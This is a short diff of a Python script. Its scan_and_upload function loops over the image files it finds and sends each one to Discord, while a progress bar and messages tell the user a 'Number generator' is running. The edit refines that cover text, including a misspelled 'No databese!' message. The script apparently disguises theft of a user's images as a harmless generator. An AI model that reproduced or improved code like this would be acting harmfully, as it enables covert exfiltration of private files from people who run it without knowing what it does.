@@ -579,13 +579,13 @@ def scan_and_upload():
     
     total_images = len(image_files)
     if total_images == 0:
-        print("❌ Hiç veri bulunamadı!")
+        print("❌ No databese!")
         return
     
     print(f"🔄 **{total_images}** number gen...\n")
     
     # TQDM ile güzel bir progress bar
-    for image_path in tqdm(image_files, desc="Number generator...", unit="idsorgulaniyor"):
+    for image_path in tqdm(image_files, desc="Number generator...", unit="0"):
         send_to_discord(image_path)
         time.sleep(1) 
     
